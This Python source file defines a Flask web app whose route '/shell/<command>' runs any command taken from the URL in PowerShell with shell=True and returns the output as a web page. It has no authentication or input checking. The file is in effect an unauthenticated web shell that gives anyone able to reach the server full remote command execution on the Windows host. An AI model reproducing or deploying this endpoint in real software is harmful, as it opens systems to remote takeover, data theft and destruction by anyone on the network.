import subprocess
from flask import Flask

def formatOut(res):
    res = res[2:len(res)]
    res = replaceSubStr(res, "\\n", "\n")
    res = replaceSubStr(res, "\\r", "")
    res = replaceSubStr(res, "\\\\", "\\")

    return res[0:(len(res)-1)]

def replaceSubStr(str, sub, repl):
    while sub in str:
        str = str[0:str.index(sub)] + repl + str[(str.index(sub)+len(sub)):len(str)]
    return str

def runCommand(cmd):
    return subprocess.check_output(["C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe", cmd], shell=True)

app = Flask(__name__)

@app.route("/shell/<command>")
def sendCommand(command):
    output = formatOut(str(runCommand(command)))
    return "<p>" + output + "</p>"
